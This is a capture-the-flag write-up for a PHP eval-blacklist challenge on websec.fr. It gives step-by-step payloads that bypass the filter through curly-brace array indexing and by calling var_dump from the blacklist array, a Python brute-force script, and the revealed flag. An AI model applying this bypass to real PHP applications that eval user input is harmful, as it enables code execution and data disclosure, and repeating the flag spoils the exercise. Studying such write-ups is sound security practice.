```
<?php
class A {
    public $pub;
    protected $pro ;
    private $pri;

    function __construct($pub, $pro, $pri) {
        $this->pub = $pub;
        $this->pro = $pro;
        $this->pri = $pri;
    }
}

include 'file_containing_the_flag_parts.php';
$a = new A($f1, $f2, $f3)               //object created
...
$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);  //array with the potential 
//function to dumb object $a
...
if ($insecure) {
    echo 'Insecure code detected!';
} else {
    eval ("echo $code;");
}
?>
```

STEP 1: Call the $blacklist array with {} since [] is blocked. 
      Payload: $blacklist{1}
OUTPUT: func_get_arg

STEP 2: Give the function of the i'th index of $blacklist array as $a
      Payload: $blacklist{1}($a)
OUTPUT: func_get_arg($a)

STEP 3: Find the index in $blacklist array which is var_dump

from requests import *
import sys
url = 'http://websec.fr/level22/index.php'
i = 0
while True:
    params = {'code': '$blacklist{{{0}}}'.format(i)}
    r = get(url, params=params)
    if r.text.find('var_dump') > -1:
        print str(i)
        sys.exit(0)
    else:
    	i=i+1
      
OUTPUT: 579

STEP 4: $blacklist{579}($a)
OUTPUT: 
  object(A)#1 (3) {
  ["pub"]=>
  string(17) "WEBSEC{But_I_was_"
  ["pro":protected]=>
  string(18) "told_that_OOP_was_"
  ["pri":"A":private]=>
  string(22) "flawless_and_stuff_:<}"
}

